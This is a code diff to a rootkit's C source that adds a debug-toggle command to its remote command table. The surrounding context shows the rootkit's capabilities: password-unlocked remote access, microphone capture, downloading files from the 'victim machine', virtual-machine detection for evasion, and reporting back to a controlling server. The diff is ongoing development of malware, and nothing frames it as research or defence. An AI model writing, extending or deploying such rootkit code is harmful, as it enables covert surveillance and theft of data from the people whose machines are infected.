@@ -43,6 +43,7 @@ static int start_microphone_handler(char *args, enum Protocol protocol);
 static int play_audio_handler(char *args, enum Protocol protocol);
 static int sysinfo_handler(char *args, enum Protocol protocol);
 static int is_in_vm_handler(char *args, enum Protocol protocol);
+static int debug_handler(char *args, enum Protocol protocol);
 
 static struct command rootkit_commands_array[] = {
     { "connect", 7, "unlock access to rootkit. Usage: connect [password]", 51, connect_handler },
@@ -67,6 +68,7 @@ static struct command rootkit_commands_array[] = {
     { "download", 8, "download a file from victim machine", 35, download_handler },
     { "sysinfo", 7, "get system information in JSON format", 37, sysinfo_handler },
     { "is_in_vm", 8, "check if remote rootkit is running in vm", 40, is_in_vm_handler },
+    { "toggle_debug", 12, "toggle debug mode", 17, debug_handler },
     { NULL, 0, NULL, 0, NULL }
 };
 
@@ -75,6 +77,22 @@ static int is_in_vm_handler(char *args, enum Protocol protocol) {
 
     if (is_running_in_virtual_env()) { send_to_server(protocol, "[YES] The rootkit is running in a virtual machine.\n"); }
     else { send_to_server(protocol, "[NOP] The rootkit is not running in a virtual machine.\n"); }
+    return SUCCESS;
+}
+
+static int debug_handler(char *args, enum Protocol protocol){
+    (void)args;
+
+    if (DEBUG) {
+        DBG_MSG("debug_handler: disabling debug mode\n");
+        DEBUG = 0;
+        send_to_server(protocol, "Debug mode disabled.\n");
+    } else {
+        DBG_MSG("debug_handler: enabling debug mode\n");
+        DEBUG = 1;
+        send_to_server(protocol, "Debug mode enabled.\n");
+    }
+
     return SUCCESS;
 }
 
